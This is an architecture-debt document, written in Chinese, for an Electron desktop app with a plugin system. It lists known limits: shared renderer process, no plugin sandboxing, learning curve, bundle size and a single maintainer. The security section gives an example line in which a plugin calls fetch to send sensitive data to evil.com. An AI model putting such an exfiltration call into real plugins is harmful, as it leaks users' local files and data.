# 已知架构局限

> 2026-08-06。盲审指出——不是 bug，是当前架构的现实约束。
> 位于 E5 收尾 → `05-收尾/架构债/`
>
> 这些问题不一定是"要修的"——有些是故意的权衡，有些是当前阶段优先级的反映。记录在此是为了让下一个 AI 和未来的自己知道：这些问题被考虑过。

---

## 一、单渲染进程——插件崩溃 = 壳崩溃

### 现状

多 WebView 回退后，所有插件和壳在同一个渲染进程的同一个 JS 堆中。

### 风险

- 插件 `while(true){}` → 整个软件卡死，ErrorBoundary 挡不住
- 插件内存泄漏 → 壳跟着 OOM
- 插件 `process.exit()` 无效（浏览器环境），但 `window.close()` 会关掉整个窗口

### 为什么不是现在修

多 WebView 尝试过——109 commits，8 个不可控 bug，回退。见 memory [[e5-multi-webview-abandoned]]。恢复路线图：Windows 分屏模型 → 每插件独立进程。

### 缓解

- 所有官方插件已知稳定（4 个插件，无死循环风险）
- 第三方插件安装前用户需信任（市场审核）

## 二、插件安全白纸

### 现状

插件可以：
- `import` 任何 npm 包
- `fetch("https://evil.com/exfil?data=" + sensitiveData)`
- 读 `window.linkdesk.filesystem.listDir("/")`（如果有权限）
- 访问所有 DOM / localStorage / IndexedDB

### 风险

用户装了一个恶意插件 → 本地文件、串口数据、配置全部暴露。

### 设计立场

项目记忆文件中写道："插件没有 API 白名单是故意的——插件不应该被限制"。这是**自由度 vs 安全性**的权衡。

### 未来方向

多 WebView 进程隔离是第一道防线（插件崩溃不影响壳）。Content Security Policy 是第二道（限制 `fetch` 目标）。插件签名/审核是第三道。当前阶段：**用户自己判断信任**。

## 三、插件学习门槛高

### 现状

- `plugin.json` schema 23KB——14 种 `contributes`、4 种 `appearsIn`
- 20 命名空间的 `linkdesk.*` API
- 9 个契约文档（`docs/03-插件制造/`）

### 影响

新插件作者面对的不是"写一个 React 组件"，是理解整个圆形大厅模型。

### 缓解方向（不做——记在这里）

- "插件脚手架"工具——`npx create-linkdesk-plugin`
- `plugin.json` 的 JSON Schema 在 VSCode 中有自动补全（已就绪）
- 示例插件 + 模板

## 四、Electron 包体积

### 现状

- 空壳 120MB（Chromium + Node.js 运行时）
- 内存占用 150MB+
- 冷启动 ~3 秒

### 对比

WPF V2：2MB、双击秒开、内存 50MB。

### 为什么选 Electron

跨平台（Windows/macOS/Linux）、Web 技术栈（React + Monaco + LSP 可复用）、插件生态（npm 全量）。体积是代价——不是 bug。

### 缓解方向（不做——记在这里）

- 用 Tauri 可以到 ~5MB。但 Phase 6 尝试过 Tauri，因 plugin glob 热加载 + IPC 复杂度放弃
- Electron 的 `asar` 压缩已启用

## 五、Bus Factor = 1

### 现状

1991 commits，一个人。127 个记忆文件 + 160+ docs 文件是给 AI 读的——AI 不是人。

### 风险

如果你（Encaron）明天不能写了，没有人能接手。圆形大厅模型和 20 条硬约束在你的脑子里——文档写了"是什么"，但"为什么这样设计"只有你知道。

### 不是代码问题

这是单人项目的现实。文档和 ESLint 规则已经做到了"让下一个 AI 不踩坑"。CLAUDE.md 22.8KB 是新 AI 进场最好的起点。但**人类**接手仍需时间。

## 六、总结

| 局限 | 可修？ | 当前状态 |
|:--|:--|:--|
| 单渲染进程 | 可修——多 WebView 恢复 | 💤 回退，109 commits 资产保留 |
| 插件安全 | 可修——CSP + 进程隔离 | 📋 多 WebView 之后 |
| 学习门槛 | 可缓解——脚手架 | 📋 不做 |
| Electron 体积 | 不可修——换框架=重写 | ✅ 已知代价 |
| Bus Factor | 不可修——招人 | ⚠️ 现实 |
